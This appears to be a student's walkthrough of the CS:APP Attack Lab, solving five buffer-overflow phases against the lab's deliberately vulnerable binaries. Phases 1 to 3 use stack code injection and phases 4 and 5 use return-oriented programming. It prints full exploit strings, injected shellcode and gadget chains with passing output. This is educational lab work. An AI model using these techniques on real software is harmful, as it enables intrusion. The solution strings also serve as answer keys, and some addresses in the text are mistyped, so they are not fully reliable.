# Attack

Firstly, I think we should read these pages carefully:

- [README-attack-lab](http://csapp.cs.cmu.edu/3e/README-attacklab)
- [Writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

Because we just self-study, so we don't need care the autograding Service.

**So we need execute with `-q` to prevent connect the service**.

## Introduction

This assignment involves generating a total of five attacks on two programs having different security vulnerabilities.

Some points:

- Must do this assignment on a machine that is similar to the one that generated your targets.
- Solutions may not use attacks to circumvent the validation code in programs. Specifically, any address we incorporate into an attack string for use by a `ret` instruction should be to one of the following destinations:
  - The addresses for function `touch1`, `touch2`, or `touch3`.
  - The address of we injected code.
  - The address of one of your gadgets from the gadget farm.
- May only construct gadgets from file `rtarget` with addresses ranging between those for functions `start_farm` and `end_farm`.

## Files

Firstly, you should read [README.txt](./README.txt).

And then, from official writeup we know the *ctarget* and *rtarget* read strings from standard input, they do so with the function `getbuf` defined below:

```cpp
unsigned getbuf() {
    char buf[BUFFER_SIZE]; // BUFFER_SIZE is a compile-time constant.
    Gets(buf);// similar to standard library function gets, destination is buf.
    return 1; // if the string typed by the user and read by getbuf is sufficiently short, it's clear that getbuf will return 1.
}
```

Then, both *ctarget* and *rtarget* take several different command line arguments:

- `-h`: print list of possible command line arguments.
- `-i FILE`: Supply input from a file, rather than from standard input.

And the program *hex2raw* will enable uy to generate these *raw* strings, because the exploit stings will typically contain byte values that do **not** correspond to the ASCII values for printing characters.

And important points:

- Exploit string must not contain byte value 0x0a at any intermediate position, since this is the ASCII code for '\n'. When `Gets` encounters this byte, it will assume us intended to terminate the string.
- *hex2raw* expects two-digit hex values separated by one or more white spaces. So if we want to create a byte with a hex value of `0`, we need to write it as `00`.  To create the word `0xdeadbeef`, we should pass `ef be ad de` to *hex2raw*. (note: the reversal required for little-endian byte ordering)

## Part I: Code Injection Attacks

In the first three phase, our exploit string will attack *ctarget*. This program is set up in a way that the stack position will be consistent from one run to the next and so that data on the stack can be treated as executable code. These features make the program vulnerable to attacks where the exploit strings contain the byte encodings of executable code.

Firstly, input command `objdump -d ctarget > ctarget.asm`, and get the assembly code.

### Phase 1

For Phase 1, we will not inject new code. Instead, the exploit string will redirect the program to execute an existing procedure.

Function `getbuf` is called within *ctarget* by a function *test* having the following C code:

```cpp
void test() {
    int val;
    val = getbuf();
    printf("No exploit.  Getbuf return 0x%x\n", val);
}
```

When `getbuf` executes its return statement, the program ordinarily resumes execution within fucntion `test`.

Our task is change this behavior, and execute the above code for `touch1` when `getbuf` executes its return statement.

Within the file *ctarget*, there is code for a function `touch1` having the following C representation:

```cpp
void touch1() {
    vlevel = 1;
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

In *ctarget.asm*, `touch1` is located at `0x4017c0`.

`test` call `getbuf`, `launch` call `test`, `stable_launch` call `launch`, `main` call `stable_launch`.

Ok, Let us begin with `gdb ./ctarge`, and make a breakpoint at getbuf by use `b getbuf`, and run by `r -q`.

Then, input `ni` twice, we can get frame information by command `i f`:

```txt
Stack level 0, frame at 0x5561dca8:
 rip = 0x4017af in getbuf (buf.c:14); saved rip = 0x401976
 called by frame at 0x5561dcb8
 source language c.
 Arglist at 0x5561dc70, args:
 Locals at 0x5561dc70, Previous frame's sp is 0x5561dca8
 Saved registers:
  rip at 0x5561dca0
```

we can infer that the return address of `getbuf` is `0x401976`, and located at address `0x5561dcb8`, and look at the `%rsp`, we get following information:

```txt
0x5561dc78:     0x0     0x0
0x5561dc88:     0x0     0x0
0x5561dc98:     0x55586000      0x401976 <test+14>
0x5561dca8:     0x2     0x401f24 <launch+112>
```

So, we need fill the address of 0x5561dc78 ~ 0x5561dca0 by chars, and change the value 0x5561ca0 ~ 0x5561ca8 to `4017c0`(the entry of `touch1`.)

Last, we can get the result1:

```bash
30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 c0 17 40
```

#### How to use *hex2raw*

For example, if we have a result file of `level1` named *result1.txt*, then we can use `cat result1.txt | ./hex2raw | ./ctarget -q`.

The output is:

```bash
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
    user id bovik
    course  15213-f15
    lab     attacklab
    result  1:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40
```

### Phase 2

The task of level 2 is to get *ctarget* to execute the code for `touch2` rahter than returning to `test`.

However, we should make it appears to `touch2`.

The code of function `touch2` is:

```cpp
void touch2(unsigned val) {
    vlevel = 2;
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

First, the cookie of us is in *cookie.txt*, my cookie is: `0x59b997fa`.

And look at `getbuf`:

```x86asm
00000000004017a8 <getbuf>:
  4017a8: 48 83 ec 28           sub    $0x28,%rsp
  4017ac: 48 89 e7              mov    %rsp,%rdi
  4017af: e8 8c 02 00 00        callq  401a40 <Gets>
  4017b4: b8 01 00 00 00        mov    $0x1,%eax
  4017b9: 48 83 c4 28           add    $0x28,%rsp
  4017bd: c3                    retq
  4017be: 90                    nop
  4017bf: 90                    nop
```

In line 0x4017af, we need inject code to stack: (It means first exec the code in the stack, and then return, and continue exec `getbuf`, then turn to `touch2`)

```x86asm
movq  0x59b997fa, %rdi
pushq $0x4017ec
retq
```

Stored as `inject.s`, and run `gcc -c inject2.s`, `objdump -d inject2.o  > inject2.d`, then get the machine code: `48 8b 3c 25 fa 97 b9 59 68 ec 17 40 00 c3`, last insert the `%rsp`, so the result2 is:

```txt
68 ec 17 40 00 48 c7 c7
fa 97 b9 59 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55
```

Run command `cat result2.txt | ./hex2raw | ./ctarget -q`, the result is:

```txt
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
    user id bovik
    course  15213-f15
    lab     attacklab
    result  1:PASS:0xffffffff:ctarget:2:68 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
```

### Phase 3

Out task if to get *ctarget* to excute the code for `touch3` rahtern than returing to `test`. And we must make it appear to `touch3`.

*ctarget* has functions `hexmatch` and `touch3`:

```cpp
int hexmatch(unsigned val, char *sval) {
    // val is cookie, 0x59b997fa
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val); // s <--- val, then s is 59b997fa
    return strncmp(sval, s, 9) === 0; // sval[0-8] == s[0-8] ?
}

void touch3(char *sval) {
    // sval in %rdi
    vlevel = 3;
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

Similar with Level 2, we need write a x86 code to revalue `%rdi`.

And we can pass a address to `%rdi`, and in order to avoid the `random` in `hexmath`, we can put the string in `0x5561ca8`, a position above return value of getbuf.

So, first we write code stored in *inject3.s*:

```x86asm
pushq $0x4018fa
mov   $0x5561dca8, %rdi
retq
```

And then `gcc -c inject3.s`, `objdump -d inject3.o > inject3.d`, then record the machine code: `68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3`, lastly result is store in *result3.txt*:

```txt
68 fa 18 40 00 48 c7 c7
a8 dc 61 55 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

Run command `cat result3.txt | ./hex2raw | ./ctarget -q` and get output:

```txt
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
    user id bovik
    course  15213-f15
    lab     attacklab
    result  1:PASS:0xffffffff:ctarget:3:68 FA 18 40 00 48 C7 C7 A8 DC 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
```

## Part II: ROP

*rtarget* has the same form as *ctarget*, but with two techinques:

- randomization
- marks the section of memory holding the stack as nonexecutable

It makes code-injection attacks can't perform.

So we need new technique called **return-oriented programming(ROP)**.

The strategy with ROP is to identify byte sequences within an existing program that consist of one or more instructions followed by the instruction `ret`. When the program executes a `ret` instruction starting with this configuration, it will initiate a chain of gadget excutions, with the `ret` instruction at the end of each gadget causing the program to jump to the beginning of the next.

## Phase 4

Repeat the attack of Phase 2, but do so on program *rtarget* using gadgets from gadget fram.

We can construct our solution using gadgets consiting of the following instruction types, and using only the first eight x86-64 registers(%rax - %rdi).

- `movq`, `popq`, `ret`, `nop`.

First, `movq %rsp, %rdi` is `48 89 e7`.

Second, `ret` is `0xc3`, `nop` is `0x90`.

we can use `popq` to make the value of stack to `%rax`(because the encoding of `popq %rax` is `58`), then we shoud exec `movq %rax, %rdi`, which encoding is `48 89 c7`.

Then, following functions are we needed.

- `addval_219` or `getval_280`
- `addval_273` or `setval_237` or `setval_426`

And then, we shoud input these address, for example, we selected `getval_280` and `setval_426`, then the result should be:

- in function `getval_280`, the needed address begin  `4019cc`.
- in function `setval_426`, the needed address begin  `4019c5`.

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

Then, run command `cat result4.txt | ./hex2raw | ./rtarget -q`, the output is:

```txt
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
    user id bovik
    course  15213-f15
    lab     attacklab
    result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

### Phase 5

Similar with Phase 4, and the result is:

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
20 00 00 00 00 00 00 00
42 1a 40 00 00 00 00 00
69 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
06 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```
